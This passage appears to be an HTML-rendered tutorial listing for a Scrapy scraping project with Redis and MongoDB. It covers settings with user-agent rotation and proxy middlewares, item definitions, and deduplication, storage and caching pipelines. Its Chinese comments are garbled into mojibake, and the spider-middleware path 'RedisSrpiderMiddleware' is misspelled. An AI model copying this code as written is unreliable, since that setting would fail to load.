    <span class="s1">&#39;scrapy_project.middlewares.RandomUserAgentMiddleware&#39;</span><span class="p">:</span> <span class="mi">400</span><span class="p">,</span>

    <span class="c1"># ä»£ç†ä¸­é—´ä»¶</span>
    <span class="s1">&#39;scrapy_project.middlewares.ProxyMiddleware&#39;</span><span class="p">:</span> <span class="mi">410</span><span class="p">,</span>

    <span class="c1"># å¼‚å¸¸æ•è·</span>
    <span class="s1">&#39;scrapy_project.middlewares.ExceptionMiddleware&#39;</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
<span class="p">}</span>

<span class="n">SPIDER_MIDDLEWARES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;scrapy_redis.spidermiddleware.RedisSrpiderMiddleware&#39;</span><span class="p">:</span> <span class="mi">100</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># ==================== Pipeline ====================</span>

<span class="n">ITEM_PIPELINES</span> <span class="o">=</span> <span class="p">{</span>
    <span class="c1"># æ•°æ®æ¸…æ´—</span>
    <span class="s1">&#39;scrapy_project.pipelines.CleanPipeline&#39;</span><span class="p">:</span> <span class="mi">100</span><span class="p">,</span>

    <span class="c1"># å»é‡æ£€æŸ¥</span>
    <span class="s1">&#39;scrapy_project.pipelines.DuplicatesPipeline&#39;</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span>

    <span class="c1"># MongoDB å­˜å‚¨</span>
    <span class="s1">&#39;scrapy_project.pipelines.MongoPipeline&#39;</span><span class="p">:</span> <span class="mi">300</span><span class="p">,</span>

    <span class="c1"># Redis ç¼“å­˜</span>
    <span class="s1">&#39;scrapy_project.pipelines.RedisPipeline&#39;</span><span class="p">:</span> <span class="mi">400</span><span class="p">,</span>
<span class="p">}</span>

<span class="c1"># ==================== MongoDB é…ç½® ====================</span>

<span class="n">MONGODB_URI</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;MONGODB_URI&#39;</span><span class="p">,</span> <span class="s1">&#39;mongodb://localhost:27017/&#39;</span><span class="p">)</span>
<span class="n">MONGODB_DATABASE</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;MONGODB_DB&#39;</span><span class="p">,</span> <span class="s1">&#39;scraper_db&#39;</span><span class="p">)</span>
<span class="n">MONGODB_COLLECTION</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%(spider)s</span><span class="s1">_items&#39;</span>

<span class="c1"># ==================== æ—¥å¿—é…ç½® ====================</span>

<span class="n">LOG_LEVEL</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
<span class="n">LOG_FORMAT</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%(asctime)s</span><span class="s1"> [</span><span class="si">%(name)s</span><span class="s1">] </span><span class="si">%(levelname)s</span><span class="s1">: </span><span class="si">%(message)s</span><span class="s1">&#39;</span>
<span class="n">LOG_DATEFORMAT</span> <span class="o">=</span> <span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S&#39;</span>

<span class="c1"># ==================== å…¶ä»–é…ç½® ====================</span>

<span class="c1"># è‡ªåŠ¨é™é€Ÿ</span>
<span class="n">AUTOTHROTTLE_ENABLED</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">AUTOTHROTTLE_START_DELAY</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">AUTOTHROTTLE_MAX_DELAY</span> <span class="o">=</span> <span class="mi">10</span>
<span class="n">AUTOTHROTTLE_TARGET_CONCURRENCY</span> <span class="o">=</span> <span class="mf">2.0</span>

<span class="c1"># Cookies</span>
<span class="n">COOKIES_ENABLED</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">COOKIES_DEBUG</span> <span class="o">=</span> <span class="kc">False</span>

<span class="c1"># Telnet æ§åˆ¶å°</span>
<span class="n">TELNETCONSOLE_ENABLED</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">TELNETCONSOLE_PORT</span> <span class="o">=</span> <span class="p">[</span><span class="mi">6023</span><span class="p">,</span> <span class="mi">6024</span><span class="p">,</span> <span class="mi">6025</span><span class="p">]</span>
</code></pre>
      </div>

      <h3 id="2-scrapy_projectitemspy">2. scrapy_project/items.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">æ•°æ®æ¨¡å‹å®šä¹‰</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">scrapy</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapy.loader.processors</span><span class="w"> </span><span class="kn">import</span> <span class="n">TakeFirst</span><span class="p">,</span> <span class="n">MapCompose</span><span class="p">,</span> <span class="n">Join</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">w3lib.html</span><span class="w"> </span><span class="kn">import</span> <span class="n">remove_tags</span>


<span class="k">def</span><span class="w"> </span><span class="nf">clean_text</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æ¸…ç†æ–‡æœ¬&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">if</span> <span class="n">text</span> <span class="k">else</span> <span class="s1">&#39;&#39;</span>


<span class="k">class</span><span class="w"> </span><span class="nc">BaseItem</span><span class="p">(</span><span class="n">scrapy</span><span class="o">.</span><span class="n">Item</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;åŸºç¡€ Item&quot;&quot;&quot;</span>
    <span class="c1"># é€šç”¨å­—æ®µ</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span><span class="n">output_processor</span><span class="o">=</span><span class="n">TakeFirst</span><span class="p">())</span>
    <span class="n">spider_name</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span><span class="n">output_processor</span><span class="o">=</span><span class="n">TakeFirst</span><span class="p">())</span>
    <span class="n">crawl_time</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span><span class="n">output_processor</span><span class="o">=</span><span class="n">TakeFirst</span><span class="p">())</span>


<span class="k">class</span><span class="w"> </span><span class="nc">ProductItem</span><span class="p">(</span><span class="n">BaseItem</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;å•†å“ Item&quot;&quot;&quot;</span>
    <span class="n">title</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span>
        <span class="n">input_processor</span><span class="o">=</span><span class="n">MapCompose</span><span class="p">(</span><span class="n">remove_tags</span><span class="p">,</span> <span class="n">clean_text</span><span class="p">),</span>
        <span class="n">output_processor</span><span class="o">=</span><span class="n">TakeFirst</span><span class="p">()</span>
    <span class="p">)</span>
    <span class="n">price</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span><span class="n">output_processor</span><span class="o">=</span><span class="n">TakeFirst</span><span class="p">())</span>
    <span class="n">stock</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span><span class="n">output_processor</span><span class="o">=</span><span class="n">TakeFirst</span><span class="p">())</span>
    <span class="n">description</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span>
        <span class="n">input_processor</span><span class="o">=</span><span class="n">MapCompose</span><span class="p">(</span><span class="n">remove_tags</span><span class="p">,</span> <span class="n">clean_text</span><span class="p">),</span>
        <span class="n">output_processor</span><span class="o">=</span><span class="n">Join</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="p">)</span>
    <span class="n">images</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">()</span>
    <span class="n">tags</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">()</span>
    <span class="n">rating</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span><span class="n">output_processor</span><span class="o">=</span><span class="n">TakeFirst</span><span class="p">())</span>
    <span class="n">reviews_count</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span><span class="n">output_processor</span><span class="o">=</span><span class="n">TakeFirst</span><span class="p">())</span>


<span class="k">class</span><span class="w"> </span><span class="nc">ArticleItem</span><span class="p">(</span><span class="n">BaseItem</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æ–‡ç«  Item&quot;&quot;&quot;</span>
    <span class="n">title</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span>
        <span class="n">input_processor</span><span class="o">=</span><span class="n">MapCompose</span><span class="p">(</span><span class="n">remove_tags</span><span class="p">,</span> <span class="n">clean_text</span><span class="p">),</span>
        <span class="n">output_processor</span><span class="o">=</span><span class="n">TakeFirst</span><span class="p">()</span>
    <span class="p">)</span>
    <span class="n">author</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span><span class="n">output_processor</span><span class="o">=</span><span class="n">TakeFirst</span><span class="p">())</span>
    <span class="n">publish_time</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span><span class="n">output_processor</span><span class="o">=</span><span class="n">TakeFirst</span><span class="p">())</span>
    <span class="n">content</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span>
        <span class="n">input_processor</span><span class="o">=</span><span class="n">MapCompose</span><span class="p">(</span><span class="n">remove_tags</span><span class="p">,</span> <span class="n">clean_text</span><span class="p">),</span>
        <span class="n">output_processor</span><span class="o">=</span><span class="n">Join</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="p">)</span>
    <span class="n">category</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">()</span>
    <span class="n">tags</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">()</span>
    <span class="n">view_count</span> <span class="o">=</span> <span class="n">scrapy</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span><span class="n">output_processor</span><span class="o">=</span><span class="n">TakeFirst</span><span class="p">())</span>
</code></pre>
      </div>

      <h3 id="3-scrapy_projectpipelinespy">3. scrapy_project/pipelines.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">æ•°æ®å¤„ç† Pipeline</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">pymongo</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">redis</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">itemadapter</span><span class="w"> </span><span class="kn">import</span> <span class="n">ItemAdapter</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapy.exceptions</span><span class="w"> </span><span class="kn">import</span> <span class="n">DropItem</span>


<span class="k">class</span><span class="w"> </span><span class="nc">CleanPipeline</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æ•°æ®æ¸…æ´— Pipeline&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_item</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">item</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="n">adapter</span> <span class="o">=</span> <span class="n">ItemAdapter</span><span class="p">(</span><span class="n">item</span><span class="p">)</span>

        <span class="c1"># æ·»åŠ çˆ¬å–æ—¶é—´</span>
        <span class="n">adapter</span><span class="p">[</span><span class="s1">&#39;crawl_time&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S&#39;</span><span class="p">)</span>
        <span class="n">adapter</span><span class="p">[</span><span class="s1">&#39;spider_name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">spider</span><span class="o">.</span><span class="n">name</span>

        <span class="c1"># æ¸…ç†ç©ºå€¼</span>
        <span class="k">for</span> <span class="n">field</span> <span class="ow">in</span> <span class="n">adapter</span><span class="o">.</span><span class="n">field_names</span><span class="p">():</span>
            <span class="n">value</span> <span class="o">=</span> <span class="n">adapter</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">field</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">value</span> <span class="ow">is</span> <span class="kc">None</span> <span class="ow">or</span> <span class="n">value</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
                <span class="n">adapter</span><span class="p">[</span><span class="n">field</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span>

        <span class="k">return</span> <span class="n">item</span>


<span class="k">class</span><span class="w"> </span><span class="nc">DuplicatesPipeline</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;å»é‡ Pipeline (åŸºäº Redis)&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">redis_host</span><span class="p">,</span> <span class="n">redis_port</span><span class="p">,</span> <span class="n">redis_password</span><span class="p">,</span> <span class="n">redis_db</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_host</span> <span class="o">=</span> <span class="n">redis_host</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_port</span> <span class="o">=</span> <span class="n">redis_port</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_password</span> <span class="o">=</span> <span class="n">redis_password</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_db</span> <span class="o">=</span> <span class="n">redis_db</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="nd">@classmethod</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">from_crawler</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">crawler</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">cls</span><span class="p">(</span>
            <span class="n">redis_host</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;REDIS_HOST&#39;</span><span class="p">),</span>
            <span class="n">redis_port</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;REDIS_PORT&#39;</span><span class="p">),</span>
            <span class="n">redis_password</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;REDIS_PASSWORD&#39;</span><span class="p">),</span>
            <span class="n">redis_db</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;REDIS_DB&#39;</span><span class="p">),</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">open_spider</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span>
            <span class="n">host</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">redis_host</span><span class="p">,</span>
            <span class="n">port</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">redis_port</span><span class="p">,</span>
            <span class="n">password</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">redis_password</span><span class="p">,</span>
            <span class="n">db</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">redis_db</span><span class="p">,</span>
            <span class="n">decode_responses</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">close_spider</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_item</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">item</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="n">adapter</span> <span class="o">=</span> <span class="n">ItemAdapter</span><span class="p">(</span><span class="n">item</span><span class="p">)</span>

        <span class="c1"># ç”Ÿæˆå”¯ä¸€æ ‡è¯†</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">adapter</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
        <span class="n">item_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

        <span class="c1"># æ£€æŸ¥æ˜¯å¦å·²å­˜åœ¨</span>
        <span class="n">key</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">spider</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2">:items:</span><span class="si">{</span><span class="n">item_hash</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
            <span class="k">raise</span> <span class="n">DropItem</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Duplicate item found: </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="c1"># æ ‡è®°å·²å¤„ç†</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="o">.</span><span class="n">setex</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">86400</span> <span class="o">*</span> <span class="mi">7</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>  <span class="c1"># ä¿ç•™7å¤©</span>

        <span class="k">return</span> <span class="n">item</span>


<span class="k">class</span><span class="w"> </span><span class="nc">MongoPipeline</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;MongoDB å­˜å‚¨ Pipeline&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">mongo_uri</span><span class="p">,</span> <span class="n">mongo_db</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">mongo_uri</span> <span class="o">=</span> <span class="n">mongo_uri</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">mongo_db</span> <span class="o">=</span> <span class="n">mongo_db</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">db</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="nd">@classmethod</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">from_crawler</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">crawler</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">cls</span><span class="p">(</span>
            <span class="n">mongo_uri</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;MONGODB_URI&#39;</span><span class="p">),</span>
            <span class="n">mongo_db</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;MONGODB_DATABASE&#39;</span><span class="p">)</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">open_spider</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">client</span> <span class="o">=</span> <span class="n">pymongo</span><span class="o">.</span><span class="n">MongoClient</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">mongo_uri</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">db</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">mongo_db</span><span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">close_spider</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_item</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">item</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="n">collection_name</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">spider</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2">_items&quot;</span>
        <span class="n">collection</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">db</span><span class="p">[</span><span class="n">collection_name</span><span class="p">]</span>

        <span class="c1"># æ’å…¥æ•°æ®</span>
        <span class="n">item_dict</span> <span class="o">=</span> <span class="n">ItemAdapter</span><span class="p">(</span><span class="n">item</span><span class="p">)</span><span class="o">.</span><span class="n">asdict</span><span class="p">()</span>
        <span class="n">collection</span><span class="o">.</span><span class="n">insert_one</span><span class="p">(</span><span class="n">item_dict</span><span class="p">)</span>

        <span class="n">spider</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Item saved to MongoDB: </span><span class="si">{</span><span class="n">item_dict</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">item</span>


<span class="k">class</span><span class="w"> </span><span class="nc">RedisPipeline</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Redis ç¼“å­˜ Pipeline&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">redis_host</span><span class="p">,</span> <span class="n">redis_port</span><span class="p">,</span> <span class="n">redis_password</span><span class="p">,</span> <span class="n">redis_db</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_host</span> <span class="o">=</span> <span class="n">redis_host</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_port</span> <span class="o">=</span> <span class="n">redis_port</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_password</span> <span class="o">=</span> <span class="n">redis_password</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_db</span> <span class="o">=</span> <span class="n">redis_db</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="nd">@classmethod</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">from_crawler</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">crawler</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">cls</span><span class="p">(</span>
            <span class="n">redis_host</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;REDIS_HOST&#39;</span><span class="p">),</span>
            <span class="n">redis_port</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;REDIS_PORT&#39;</span><span class="p">),</span>
            <span class="n">redis_password</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;REDIS_PASSWORD&#39;</span><span class="p">),</span>
            <span class="n">redis_db</span><span class="o">=</span><span class="n">crawler</span><span class="o">.</span><span class="n">settings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;REDIS_DB&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>  <span class="c1"># ä½¿ç”¨ä¸åŒçš„ DB</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">open_spider</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span>
            <span class="n">host</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">redis_host</span><span class="p">,</span>
            <span class="n">port</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">redis_port</span><span class="p">,</span>
            <span class="n">password</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">redis_password</span><span class="p">,</span>
            <span class="n">db</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">redis_db</span><span class="p">,</span>
            <span class="n">decode_responses</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">close_spider</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">process_item</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">item</span><span class="p">,</span> <span class="n">spider</span><span class="p">):</span>
        <span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

        <span class="n">adapter</span> <span class="o">=</span> <span class="n">ItemAdapter</span><span class="p">(</span><span class="n">item</span><span class="p">)</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">adapter</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
        <span class="n">item_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">url</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

        <span class="c1"># ç¼“å­˜åˆ° Redis</span>
        <span class="n">key</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">spider</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2">:cache:</span><span class="si">{</span><span class="n">item_hash</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">adapter</span><span class="o">.</span><span class="n">asdict</span><span class="p">(),</span> <span class="n">ensure_ascii</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">redis_client</span><span class="o">.</span><span class="n">setex</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">3600</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>  <span class="c1"># ç¼“å­˜1å°æ—¶</span>

        <span class="k">return</span> <span class="n">item</span>
</code></pre>
      </div>

      <h3 id="4-scrapy_projectmiddlewarespy">4. scrapy_project/middlewares.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ä¸­é—´ä»¶</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapy</span><span class="w"> </span><span class="kn">import</span> <span class="n">signals</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapy.downloadermiddlewares.useragent</span><span class="w"> </span><span class="kn">import</span> <span class="n">UserAgentMiddleware</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapy.exceptions</span><span class="w"> </span><span class="kn">import</span> <span class="n">IgnoreRequest</span>


